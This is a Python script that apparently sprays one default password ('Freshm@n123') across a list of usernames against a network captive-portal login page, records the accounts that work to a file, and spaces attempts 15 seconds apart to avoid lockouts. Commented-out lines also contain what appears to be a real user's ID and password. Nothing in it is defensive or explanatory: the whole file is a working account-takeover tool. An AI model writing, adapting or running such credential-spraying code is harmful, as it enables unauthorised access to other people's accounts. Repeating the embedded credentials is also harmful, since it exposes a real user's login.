import requests
from time import sleep
import time
# epoch_time = round(time.time()*1000)
# mode = 191
# username = 99220040391
# password = "KLU@626126"
# # data = {
#     "mode": "191",
#     "username": f"${username}",
#     "password": "KLU%40626126",
#     "a":  round(time.time()*1000),
#     "producttype": "0"
# }
headers = {
    "Host": "172.16.103.254:8090",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:107.0) Gecko/20100101 Firefox/107.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://172.16.103.254:8090",
    "DNT": "1",
    "Connection": "keep-alive",
    "Referer": "http://172.16.103.254:8090/httpclient.html", }
list_file = open('list.txt', 'r').readlines()
i = 0
print(list_file[i])
h2={
    "Host": "172.16.103.254:8090",
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:107.0) Gecko/20100101 Firefox/107.0",
"Accept": "*/*",
"Accept-Language": "en-US,en;q=0.5",
"Accept-Encoding": "gzip, deflate",
"Content-Type": "application/x-www-form-urlencoded",
"Origin": "http://172.16.103.254:8090",
"DNT": "1",
"Connection": "keep-alive",
"Referer": "http://172.16.103.254:8090/httpclient.html"
}

while len(list_file) > 0:
    url = "http://172.16.103.254:8090/login.xml"

    # text = getHTMLText(url)
    cur_time = round(time.time()*1000)
    data = {
        "mode": "191",
        "username":  list_file[0].rstrip(),
        "password": "Freshm@n123",
        "a":  f'{cur_time}',
        "producttype": "0"
    }

    r = requests.post(url, data=data, headers=headers, timeout=2000)
    resp = r.text
    pmsg=r.text.split("</status><message><![CDATA[")[1]
    msg=pmsg.split(' ]]></message><logoutmessage><![CDATA')[0]
    print(msg)
    if "Invalid user name/password" in resp:
        print(f"Invalid {list_file[0]}\n")
        list_file2 = open("list.txt", 'w')
        list_file.pop(0)
        list_file2.writelines(list_file[:])
        i+=1
        sleep(15)
        continue
    print(f"Success: {list_file[0]}\n")
    file2 = open("work.txt", 'a')
    file2.write(list_file[0])
    # file2.write('\n')
    file2.close()
    list_file2 = open("list.txt", 'w')
    list_file.pop(0)
    list_file2.writelines(list_file[:])
    list_file2.close()
    cur_time = round(time.time()*1000)
    logout_data = {
        "mode": "193",
        "username":  list_file[0].rstrip(),
        # "password": "KLU@626126",
        "a":  f'{cur_time}',
        "producttype": "0"
    }
    # i += 1
    sleep(15)
    r2 = requests.post("http://172.16.103.254:8090/logout.xml",headers=h2,data=logout_data)
    pmsg=r2.text.split("[LOGIN]]></status><message><![CDATA[")[1].split(']]>')[0]
    print(pmsg)
    sleep(15)
    # username += 1
    # username += 1

list_file2.close()